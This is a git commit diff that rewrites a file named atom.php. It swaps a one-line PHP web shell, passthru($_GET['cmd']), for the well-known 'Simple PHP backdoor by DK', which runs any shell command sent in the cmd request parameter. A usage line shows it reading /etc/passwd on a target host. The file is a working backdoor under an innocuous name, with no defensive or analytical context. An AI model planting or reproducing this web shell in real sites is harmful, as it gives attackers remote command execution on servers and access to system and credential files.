f2747ee5b7d9e790ceea818e5eaf71e21947d729
dohnjoeph <31086693+dohnjoeph@users.noreply.github.com>
2019-09-07 11:58:48 -0400

    a

--- atom.php
+++ atom.php
@@ -1,4 +1,17 @@
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
+
 <?php
-echo 'yes';
-passthru($_GET['cmd']);
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
 ?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+
+<!--    http://michaeldaw.org   2006    -->
